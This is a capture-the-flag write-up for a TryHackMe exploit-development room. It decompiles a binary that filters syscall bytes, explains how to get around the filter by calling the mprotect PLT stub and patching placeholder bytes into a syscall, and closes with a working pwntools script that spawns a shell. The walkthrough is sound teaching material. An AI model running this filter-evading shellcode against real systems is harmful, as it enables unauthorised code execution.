# [Void Execution](https://tryhackme.com/room/hfb1voidexecution)

## Learn how to bypass restrictions in Linux exploit development.

Please help us find the vulnerability and craft an exploit for the new Void service.

You can connect to the machine with the following command:

Access the machine on the following IP and Port:
<TARGET_IP> 9008
You can download the files [here](https://drive.google.com/file/d/1GNGIBBvVgK3j_5owjXFueTvIk4ZceIpJ/view?usp=sharing).

_This challenge was originally a part of the Hackfinity Battle 2025 CTF Event._

### What is the flag?

1. Open `voidexec` with Binary Ninja.

```c
004012eb    int32_t main(int32_t argc, char** argv, char** envp)

004012eb    {
004012eb        setup();
00401324        void* buf = mmap(0xc0de0000, 0x64, 7, 0x22, 0xffffffff, 0);
0040133e        memset(buf, 0, 0x64);
0040134d        puts("\nSend to void execution: ");
00401363        read(0, buf, 0x64);
00401372        puts("\nvoided!\n");
00401372
00401385        if (forbidden(buf))
00401385        {
004013a2            exit(1);
0040138c            /* no return */
00401385        }
00401385
004013a2        mprotect(buf, 0x64, 4);
004013b0        buf();
004013b8        return 0;
004012eb    }
```

2. Examine `forbidden` to understand the filter. It walks every byte in the buffer and rejects the shellcode if it finds:
   - A single byte `0x0f`. This is the escape prefix for two-byte x86-64 opcodes, and the first byte of both the `syscall` instruction and `sysenter`. The check on `0x0f` alone means **any opcode starting with `0x0f`** is banned, not only those two.
   - The two-byte sequence `0xcd 0x80`. The legacy 32-bit `int 0x80` interrupt.

> This effectively bans all three standard Linux syscall mechanisms. Standard shellcode assembled by `asm(shellcraft.sh())` will be rejected immediately.

```c
00401250    int64_t forbidden(void* arg1)

00401250    {
00401250        void* var_18 = nullptr;
00401250
004012e2        while (true)
004012e2        {
004012e2            if (var_18 > 0x62)
004012e4                return 0;
004012e4
00401282            if (*(uint8_t*)((char*)var_18 + arg1) == 0xf)
00401282                break;
00401282
004012c0            if (*(uint8_t*)((char*)var_18 + arg1) == 0xcd
004012c0                && *(uint8_t*)((char*)arg1 + (char*)var_18 + 1) == 0x80)
004012c0            {
004012cc                puts("Forbidden!");
004012d1                return 1;
004012c0            }
004012c0
004012d8            var_18 += 1;
004012e2        }
004012e2
0040128e        puts("Forbidden!");
00401293        return 1;
00401250    }
```

3. Note the `mprotect` PLT stub at `0x401100`. Binary Ninja decompiles PLT trampolines as apparent self-calls; in reality this is a one-instruction jump through the GOT to the real `libc mprotect`. Because the binary is non-PIE, this stub always lives at the fixed address `0x401100`. The key observation is that calling this PLT entry requires only `call rbx`, an opcode with no `0x0f` byte. So calling `mprotect` from within the shellcode is safe.

```c
00401100    int64_t mprotect()

00401100    {
00401100        /* tailcall */
00401104        return mprotect();
00401100    }
```

4. Plan the exploit. There are two constraints to defeat simultaneously:
   - **No `0x0f` byte allowed**: prevents any direct syscall instruction in the submitted shellcode.
   - **Execute-only page at runtime**: `mprotect(buf, 0x64, 4)` strips write access before `buf()` is called, so the shellcode cannot write to itself as initially delivered.

5. The solution is **self-modifying shellcode** in two stages:
   - **Stage 1 - Restore write access:** The shellcode opens by calling `mprotect_plt(0xc0de0000, 0x64, 7)` directly, adding `PROT_READ | PROT_WRITE | PROT_EXEC` back to the shellcode page. This call uses `call rbx`, no forbidden bytes.
   - **Stage 2 - Patch and execute syscall:** Two `inc byte ptr [rip + offset]` instructions modify a two-byte placeholder `\x0e\x04` in-place, incrementing each byte by 1 to produce `\x0f\x05`. The live syscall opcode. Because `\x0e\x04` was present in the submitted shellcode, it passed the forbidden check. The `inc` opcode `FE` also contains no `0x0f` byte. Execution then falls through the now-patched bytes and triggers `execve("/bin/sh", NULL, NULL)`.

To compute the address of `mprotect_plt` without embedding a zero-padded 64-bit constant, the shellcode exploits the fact that **`r13` holds `main`'s runtime address** when `buf()` is called.

6. Build and send the exploit

```py
from pwn import *
# Adjust target IP and port as needed
target = remote("<TARGET_IP>", 9008)
context.arch = 'amd64'
# These offsets must be obtained from analyzing the local ELF binary
main_offset = 0x12eb
mprotect_offset = 0x1100
# Base address is 0xc0de0000, length 100 bytes
shellcode = asm(f"""
    /* Compute mprotect address from r13 (holds main at runtime) */
    lea rbx, [r13 - {main_offset} + {mprotect_offset}]
    mov rdi, 0xc0de0000       /* address to change perms */
    mov rsi, 0x64             /* length */
    mov rdx, 0x7              /* PROT_READ | WRITE | EXEC */
    call rbx                  /* mprotect(addr, len, prot) */
    /* Setup execve("/bin/sh", NULL, NULL) */
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x3b             /* syscall: execve */
    mov rdi, 0x68732f6e69622f
    push rdi
    mov rdi, rsp
    /* Self-modifying syscall patch */
    inc byte ptr [rip + syscall]
    inc byte ptr [rip + syscall + 1]
    syscall:
    .byte 0x0e, 0x04          /* placeholder for syscall */
""")
print(f"[+] Sending {len(shellcode)} bytes of shellcode...")
target.recvuntil(b"Send to void execution:")
target.sendline(shellcode)
target.interactive()
```

<img width="528" height="288" alt="SCREEN01" src="https://github.com/user-attachments/assets/1411bab2-400a-4429-b030-461c3b4e6555" />
